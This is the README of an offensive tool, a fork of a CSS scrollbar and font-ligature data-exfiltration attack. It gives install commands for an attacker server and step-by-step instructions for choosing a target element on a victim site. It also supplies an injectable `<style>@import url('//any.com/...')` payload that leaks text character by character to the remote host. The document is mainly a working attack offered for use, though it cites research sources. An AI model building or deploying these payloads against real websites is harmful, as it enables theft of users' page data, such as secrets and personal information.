# Preface

Code is kinda janky and not well tested. 

# Install on your own server

0. Get a Debian 12 VPS and link a domain(any.com) to your server and wait for it to  propagate(https://www.whatsmydns.net/) (usually takes 1hour)

1. Run the following on the Debian 12 VPS:

   ```bash
   apt install certbot python3-certbot-apache -y
   certbot --authenticator webroot --installer apache --register-unsafely-without-email
   ```
  - Agree to the terms, enter the domain(any.com) you linked earlier and enter the webroot /var/www/html

2. Then run the following:

```bash
apt install git -y && git clone https://github.com/sys0wn/css-scrollbar-attack && cd css-scrollbar-attack && chmod +x install.sh && bash install.sh
```
# How to use it

0. Use a chromium-based Browser that supports webkit scrollbar-styling. I have tested Chromium and Google Chrome.
1. On the website you are trying to target pick an html element you want to steal.
2. Find a combination of css selectors, that points directly to the element(e.g: p { color: red } targets all p-tags, so if there is more than 1 it doesn't point to ONLY one element and therefore no exfiltration will be possible). Use Selectors like ```https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_selectors``` and combine as many as needed to point directly to the target element. Examples for this:

```
<!doctype html>
<body>
<div>
   <h4>a</h4>
   <p id=leakme class="leakme">stealThis</p>
</div>
</body>
</html>
```

Here, the "stealThis" could be pointed to for example by: p {}, div > p {}, #leakme {}, .leakme {}, div > #leakme {}, body > div > p {}, h4 + p {}, div > h4 + p {} and many many more


You can test if your combination of selectors points directly to your target element by hitting CTRL+SHIFT+C and searching for something like ```#leakme``` or ```div > p```; If there is only one result for your search that is a combination of selectors you can use!

3. Create the payload for your CSS-Injection by plugging your combination of selectors into the following syntax: ```<style>@import url('//any.com/%23leakme/css.css');</style>``` where you have to replace the %23leakme with your URL-ENCODED(you can use websites like https://www.urlencoder.org/) combination of selectors.

# Example

```
<!doctype html>
<body>
<div>
   <h4>a</h4>
   <p id=leakme class="leakme">stealThis</p>
</div>
</body>
</html>
```

```div > h4 + p```  -->  ```<style>@import url('//any.com/div%20%3E%20h4%20%2B%20p/css.css');</style>```

# Demo

https://jsfiddle.net/q3mc5kxn/1/

https://any.com/index.html                 //Once you've installed it on your server


# How it works (short)

If <style>@import url('//any.com/div%20%3E%20h4%20%2B%20p/css.css');</style> is injected into a website the server will create a lot of fonts with different ligatures (https://en.wikipedia.org/wiki/Ligature_(writing)) that are used to bruteforce one character at a time by performing a binary search on the target text and exfiltrating it to a remote server. All the logic is serverside and the only client-side code that has to be injected is the <style> tag above that points to the target element.

# How it works (medium)


https://any.com/ is running a node server(this Github project), which will be the backend for the attack and serve all the css and handle the logic involved.
***
A ligature in a font is a sequence of at least two characters, which has its own graphical representation (for more info https://en.wikipedia.org/wiki/Ligature_(writing))
***

1. The @import will send a GET request to https://any.com/div%20%3E%20h4%20%2B%20p/css.css
2. The server receives the combination of selectors ```div%20%3E%20h4%20%2B%20p``` and therefore now knows which element to target and which text to steal
3. As a response to the GET request the following css is returned ```@import url('//any.com/start');```. This css will also be applied to the target page and a GET Request will be sent to https://any.com/start

4. Now, as a response to /start the any.com backend will do the following:

- For each character in "@.abcdefghijklmnopqrstuvwxyz...", generate a ligature starting from the first-letter. So lets say the text of the target element starts with a "s"; we will create 3 fonts: 1 for "@.abcdefgh", 1 for "ijklmnopqr" and 1 for "stuvwxyz". Now we create the ligatures: font 1 will have a ligature for "s@", "s.", "sa", "sb" ...  font2 will have a ligature for "si", "sj" ... and so on. 
- Using a CSS animation apply each of the fonts to the target-element one after each other. The first font that causes one of the ligatures("s@", "s.", "st", "sa" ...) to render is interesting to us, as if e.g. the font for "@.abcdefgh" causes a ligature to render, that gives us the information, that the second character is one of "@.abcdefgh". (Because a ligature from the first letter to the second letter was rendered which means that the second character has to be one of "@.abcdefgh".
- In order to exfiltrate this information, each of the ligatures has a very high ```horiz-adv-x``` value. This will result in the target-element getting substantially wider if the current "correct" font  is applied and a ligature is rendered. This width change will cause a scrollbar to appear. If the scrollbar appears, it will exfiltrate the information, that the second letter is one of "@.abcdefgh". This is done like this:

```
p::-webkit-scrollbar {
    background: blue;
}
p::-webkit-scrollbar:horizontal {
    background:var(--x);
}`;
```

Where --x (a css variable) is set to something like "https://any.com/@.abcdefgh" when font1 is applied at the beginning.

- Now, start again. This time create ligatures for each character in "@.abcdefgh" -> font1: "@.ab" font2: "cde", font3: "fgh"
- Keep using the same technique to perfrom a kind of binary search on each letter using ligatures, cutting the amount of possible letters in half every time until only one remains. Then move on the next letter performing the next binary search until the entire word is leaked.

References: https://aszx87410.github.io/beyond-xss/en/ch3/css-injection-2/, https://book.hacktricks.xyz/pentesting-web/xs-search/css-injection, https://vwzq.net/slides/2019-s3_css_injection_attacks.pdf, https://github.com/cgvwzq/css-scrollbar-attack/

# How it works (long)

Read the (kinda) documented source code (index.js)

# Limitations

- In the current configuration ~30 chars is max amount that can be exfiltrated but this is not a hard limit and can be increased I think
- Characters a-z A-Z 0-9 .@+!#=$^    but in theory there are no limitations which printable characters are possible, it's just a hassle because you have to correctly encode it and stuff.
- The Browser tab from which the text will be exfiltrated always has to stay in focus(don't switch tab, dont minimize window etc.)
- It takes some time to exfiltrate the text, but this can be optimised, for example by using only a-z if the others aren't needed or decreasing the DURATION and/or DELAY variable in the js and so on. The current configuration of the code is aimed at reliability and support for as much chars as possible etc.

# Tip

- If you face seemingly illogical errors while trying to reproduce this go to: ```chrome://settings/privacy``` and clean the cache(fonts are cached which might mess with the detection and exfiltration.
***
# This repo is a fork of https://github.com/cgvwzq/css-scrollbar-attack which I have modified, improved and documented. Thanks to cgvwzq for the awesome code and thanks to @SecurityMB (https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/) for coming up with (part of) the idea (I think).
